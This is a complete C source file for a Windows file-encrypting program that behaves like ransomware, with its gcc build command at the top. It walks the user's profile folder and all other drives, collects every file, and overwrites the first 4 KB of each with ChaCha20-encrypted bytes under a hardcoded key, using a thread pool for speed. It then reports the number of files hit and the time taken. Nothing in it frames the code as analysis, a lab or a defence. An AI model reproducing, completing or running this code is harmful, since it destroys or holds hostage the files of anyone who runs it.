gcc -O3 -s -ffreestanding -nostdlib -fno-builtin -e EntryPoint "warning.c" -o "warning.exe" -lkernel32 -luser32


#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <windows.h>
#include <stdint.h>

int lstrlenA_custom(const char* s) {
    int i = 0;
    while (s[i]) i++;
    return i;
}

void lstrcpyA_custom(char* dest, const char* src) {
    while ((*dest++ = *src++));
}

typedef struct {
    char UserProfilePath[MAX_PATH];
    char OtherDrives[10][4];
    int OtherDrivesCount;
} SYSTEM_SCOUT;

typedef struct {
    OVERLAPPED overlapped;
    HANDLE fileHandle;
    BYTE buffer[4096];
    int isWriting;
} IO_CONTEXT;

char** driveFiles = NULL;
int fileCount = 0;
int maxFiles = 1024;
uint32_t key[4] = { 0xDEADBEEF, 0xCAFEBABE, 0xFACEFEED, 0x13371337 };

void Get_Partitions(SYSTEM_SCOUT* scout) {
    char winDir[MAX_PATH];
    char userName[256];
    DWORD userLen = sizeof(userName);
    char driveStrings[256];
    
    GetWindowsDirectoryA(winDir, MAX_PATH);
    char winDrive = winDir[0];

    GetUserNameA(userName, &userLen);

    scout->UserProfilePath[0] = winDrive;
    scout->UserProfilePath[1] = ':';
    scout->UserProfilePath[2] = '\\';
    scout->UserProfilePath[3] = '\0';
    lstrcpyA_custom(scout->UserProfilePath + 3, "Users\\");
    lstrcpyA_custom(scout->UserProfilePath + lstrlenA_custom(scout->UserProfilePath), userName);
    
    int len = lstrlenA_custom(scout->UserProfilePath);
    if (scout->UserProfilePath[len-1] != '\\') {
        scout->UserProfilePath[len] = '\\';
        scout->UserProfilePath[len+1] = '\0';
    }

    scout->OtherDrivesCount = 0;
    GetLogicalDriveStringsA(sizeof(driveStrings), driveStrings);
    char* currentDrive = driveStrings;
    while (*currentDrive && scout->OtherDrivesCount < 10) {
        if (currentDrive[0] != winDrive) {
            for(int j=0; j<4; j++) scout->OtherDrives[scout->OtherDrivesCount][j] = currentDrive[j];
            scout->OtherDrivesCount++;
        }
        currentDrive += lstrlenA_custom(currentDrive) + 1;
    }
}

#define ROTL(a,b) (((a) << (b)) | ((a) >> (32 - (b))))
#define QR(a, b, c, d) ( \
    a += b, d ^= a, d = ROTL(d, 16), \
    c += d, b ^= c, b = ROTL(b, 12), \
    a += b, d ^= a, d = ROTL(d, 8), \
    c += d, b ^= c, b = ROTL(b, 7))

void chacha20_block(uint32_t out[16], uint32_t const in[16]) {
    uint32_t x[16];
    for (int i = 0; i < 16; i++) x[i] = in[i];
    for (int i = 0; i < 10; i++) {
        QR(x[0], x[4], x[8], x[12]); QR(x[1], x[5], x[9], x[13]);
        QR(x[2], x[6], x[10], x[14]); QR(x[3], x[7], x[11], x[15]);
        QR(x[0], x[5], x[10], x[15]); QR(x[1], x[6], x[11], x[12]);
        QR(x[2], x[7], x[8], x[13]);  QR(x[3], x[4], x[9], x[14]);
    }
    for (int i = 0; i < 16; i++) out[i] = x[i] + in[i];
}

void encrypt_buffer(uint8_t* buffer, size_t buffer_size) {
    uint32_t state[16] = {
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        key[0], key[1], key[2], key[3],
        key[0], key[1], key[2], key[3],
        0, 0, 0xDEADBEEF, 0xCAFEBABE
    };
    uint32_t output[16];
    for (size_t i = 0; i < buffer_size; i += 64) {
        chacha20_block(output, state);
        state[12]++;
        uint32_t* buf_ptr = (uint32_t*)(buffer + i);
        for (int j = 0; j < 16 && (i + j * 4) < buffer_size; j++) {
            buf_ptr[j] ^= output[j];
        }
    }
}

DWORD WINAPI WorkerThread(LPVOID lpParam) {
    HANDLE iocp = (HANDLE)lpParam;
    DWORD bytes;
    ULONG_PTR key;
    LPOVERLAPPED overlapped;
    while (GetQueuedCompletionStatus(iocp, &bytes, &key, &overlapped, INFINITE)) {
        if (overlapped == NULL) break;
        IO_CONTEXT* ctx = (IO_CONTEXT*)overlapped;
        if (!ctx->isWriting && bytes > 0) {
            encrypt_buffer(ctx->buffer, bytes);
            ctx->isWriting = 1;
            ctx->overlapped.Offset = 0; ctx->overlapped.OffsetHigh = 0;
            WriteFile(ctx->fileHandle, ctx->buffer, bytes, NULL, &ctx->overlapped);
        } else {
            CloseHandle(ctx->fileHandle);
            HeapFree(GetProcessHeap(), 0, ctx);
        }
    }
    return 0;
}

void Deep_Scout_Manager(const char* rootPath) {
    char searchPath[MAX_PATH];
    WIN32_FIND_DATAA fd;
    int len = lstrlenA_custom(rootPath);
    lstrcpyA_custom(searchPath, rootPath);
    searchPath[len] = '*'; searchPath[len+1] = '\0';
    
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.cFileName[0] == '.' && (fd.cFileName[1] == '\0' || (fd.cFileName[1] == '.' && fd.cFileName[2] == '\0')))
            continue;
        char fullPath[MAX_PATH];
        lstrcpyA_custom(fullPath, rootPath);
        lstrcpyA_custom(fullPath + lstrlenA_custom(fullPath), fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            char nextDir[MAX_PATH];
            lstrcpyA_custom(nextDir, fullPath);
            int nLen = lstrlenA_custom(nextDir);
            nextDir[nLen] = '\\'; nextDir[nLen+1] = '\0';
            Deep_Scout_Manager(nextDir);
        } else {
            if (fileCount >= maxFiles) {
                maxFiles *= 2;
                driveFiles = (char**)HeapReAlloc(GetProcessHeap(), 0, driveFiles, maxFiles * sizeof(char*));
            }
            int fLen = lstrlenA_custom(fullPath);
            char* savedPath = (char*)HeapAlloc(GetProcessHeap(), 0, fLen + 1);
            lstrcpyA_custom(savedPath, fullPath);
            driveFiles[fileCount++] = savedPath;
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

typedef ULONGLONG (WINAPI* PGETTICKCOUNT64)(void);
typedef int (WINAPI* PWSZPRINTFA)(LPSTR, LPCSTR, ...);

void EntryPoint() {
    SYSTEM_SCOUT scout;
    for(int i=0; i<sizeof(SYSTEM_SCOUT); i++) ((char*)&scout)[i] = 0;
    Get_Partitions(&scout);

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    PGETTICKCOUNT64 pTick = (PGETTICKCOUNT64)GetProcAddress(hK32, "GetTickCount64");
    ULONGLONG startTime = pTick();

    driveFiles = (char**)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxFiles * sizeof(char*));

    Deep_Scout_Manager(scout.UserProfilePath);
    for (int i = 0; i < scout.OtherDrivesCount; i++) {
        Deep_Scout_Manager(scout.OtherDrives[i]);
    }

    if (fileCount > 0) {
        SYSTEM_INFO si; GetSystemInfo(&si);
        int tCount = si.dwNumberOfProcessors * 2;
        HANDLE iocp = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, tCount);
        HANDLE* threads = (HANDLE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HANDLE) * tCount);

        for (int i = 0; i < tCount; i++) threads[i] = CreateThread(NULL, 0, WorkerThread, iocp, 0, NULL);

        for (int i = 0; i < fileCount; i++) {
            HANDLE hf = CreateFileA(driveFiles[i], GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                CreateIoCompletionPort(hf, iocp, (ULONG_PTR)hf, 0);
                IO_CONTEXT* ctx = (IO_CONTEXT*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_CONTEXT));
                ctx->fileHandle = hf; ctx->isWriting = 0;
                ReadFile(hf, ctx->buffer, 4096, NULL, &ctx->overlapped);
            }
        }

        for (int i = 0; i < tCount; i++) PostQueuedCompletionStatus(iocp, 0, 0, NULL);
        WaitForMultipleObjects(tCount, threads, TRUE, INFINITE);

        char res[128];
        HMODULE hU32 = LoadLibraryA("user32.dll");
        if (hU32) {
            PWSZPRINTFA pW = (PWSZPRINTFA)GetProcAddress(hU32, "wsprintfA");
            pW(res, "Total Files: %d | Time: %I64u ms", fileCount, pTick() - startTime);
            MessageBoxA(NULL, res, "Done", 0);
        }
    }
    ExitProcess(0);
}